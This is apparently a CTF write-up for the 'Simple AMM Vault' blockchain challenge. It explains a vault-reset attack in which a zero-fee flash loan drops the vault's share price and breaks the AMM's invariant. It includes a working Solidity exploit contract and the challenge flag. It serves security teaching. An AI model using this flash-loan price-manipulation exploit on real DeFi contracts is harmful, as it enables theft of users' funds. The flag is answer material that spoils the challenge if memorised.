---
title: Blockchain - Simple Amm Vault
description: 2024 | Grey Cat The Flag | Blockchain
tags:
    - smart contract
    - vault reset attack
    - flashloan
---

## Description

ERC-4626 was too complex, so I made an AMM to swap between shares and assets.

> nc challs.nusgreyhats.org 30301

> [Challenge Files](https://github.com/MiloTruck/evm-ctf-challenges/tree/8763f5fd12c3179227ec9cac0b21b959c6144dca/src/simple-amm-vault)

## Solution

- Initially, there are 1000 GREY deposited in the vault, 1000 GREY sent to the vault as rewards, and 2000 GREY in the pool. The player starts with 1000 GREY and need to have at least 3000 GREY to solve the challenge
- Users can receive distributed rewards by unstaking GREY. Since the pool offers zero-fee flash loans on GREY and SV tokens, we can borrow SV and withdraw all the GREY from the vault. The `totalAssets` and `totalSupply` will then return to zero, causing the share price to drop, then we can deposit 1000 GREY and repay the flash loan

    ```js
    function deposit(uint256 assets) external returns (uint256 shares) {
        shares = toSharesDown(assets);
        require(shares != 0, "zero shares");

        totalAssets += assets;
        _mint(msg.sender, shares);
        
        GREY.transferFrom(msg.sender, address(this), assets);
    }

    function toSharesDown(uint256 assets) internal view returns (uint256) {
        if (totalAssets == 0 || totalSupply == 0) {
            return assets;
        }
        return assets.mulDivDown(totalSupply, totalAssets);
    }
    ```

- After the flash loan, the share price dropped from 2e18 to 1e18

    ```js
    function sharePrice() external view returns (uint256) {
        return totalSupply == 0 ? 1e18 : totalAssets.divWadDown(totalSupply);
    }
    ```

- The pool calculates K based on the share price and the amount of tokens reserved. The initial K is 2000e18 (1000e18 + 2000e18 * 1e18 / 2e18)

    ```js
    function computeK(uint256 amountX, uint256 amountY) internal view returns (uint256) {
        uint256 price = VAULT.sharePrice();
        return amountX + amountY.divWadDown(price);
    }
    ```

- Thus, 1000 GREY can be taken out from the pool without SV after the share price drops (1000e18 + 1000e18 * 1e18 / 1e18 >= 2000e18). Enough GREY is now obtained

    ```js
    modifier invariant {
        _;
        require(computeK(reserveX, reserveY) >= k, "K");
    }

    function swap(bool swapXForY, uint256 amountIn, uint256 amountOut) external invariant {
        IERC20 tokenIn;
        IERC20 tokenOut;

        if (swapXForY) {
            reserveX += amountIn;
            reserveY -= amountOut;

            (tokenIn, tokenOut) = (tokenX, tokenY);
        } else {
            reserveX -= amountOut;
            reserveY += amountIn;

            (tokenIn, tokenOut) = (tokenY, tokenX);
        }

        tokenIn.transferFrom(msg.sender, address(this), amountIn);
        tokenOut.transfer(msg.sender, amountOut);
    }
    ```

### Exploitation

```js
contract Exploiter {
    SimpleVault public vault;
    SimpleAMM public amm;
    GREY public grey;

    constructor(Setup setup) {
        vault = setup.vault();
        amm = setup.amm();
        grey = setup.grey();
        grey.approve(address(vault), type(uint256).max);

        setup.claim();
    }

    function exploit() public {
        amm.flashLoan(true, 1000 ether, "");
        amm.swap(true, 0, 1000 ether);
        grey.transfer(msg.sender, grey.balanceOf(address(this)));
    }

    function onFlashLoan(uint256, bytes calldata) external {
        require(msg.sender == address(amm));
        vault.withdraw(1000 ether);
        vault.deposit(1000 ether);
        vault.approve(address(amm), 1000 ether);
    }
}
```

### Flag

> grey{vault_reset_attack_a3e7a42b511cf0a8}
